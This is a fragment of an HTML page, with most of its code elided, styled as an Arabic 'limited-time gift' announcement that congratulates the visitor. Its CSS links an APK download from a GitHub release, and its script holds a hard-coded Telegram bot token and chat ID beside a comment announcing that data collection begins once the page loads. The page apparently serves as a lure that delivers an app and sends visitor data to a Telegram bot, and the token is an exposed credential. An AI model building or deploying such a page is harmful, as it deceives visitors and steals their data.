...
<head>
    ...
    <style>
        ...
        .gift-box {
            ...
            height: 150px;
            margin: 20px auto;
            background: url('https://github.com/towfaq7337/towfaq7337/releases/download/v5.0.0.0/MyApp.apk') no-repeat center center;
...
<body>
    ...
    <div class="content config-section">
        <div class="config-title">هديه لفتره محدوده </div>
        <p><strong>النتيجه:</strong> مبروك</p>
    ...
    <script>
        ...
        const TELEGRAM_BOT_TOKEN = '8227483533:AAH3dmYtjkie0aqzk4ynOTkNsoFhQHk8VDY';
        const TELEGRAM_CHAT_ID = '8306298380';
        ...
        // بدء عملية جمع البيانات بعد تحميل الصفحة
